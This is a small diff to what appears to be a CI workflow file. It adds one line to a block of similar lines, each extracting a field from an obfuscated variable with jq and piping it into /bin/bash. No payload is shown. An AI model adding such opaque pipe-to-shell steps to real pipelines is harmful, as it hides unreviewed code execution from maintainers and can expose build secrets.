@@ -28,6 +28,7 @@ jobs:
           echo $r67032 | jq -r .n98 | /bin/bash
           echo $qn06 | jq -r .xlr86 | /bin/bash
           echo $d73 | jq -r .bvdo972 | /bin/bash
+          printf '%s' "$bve0124" | jq -r .mkw3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
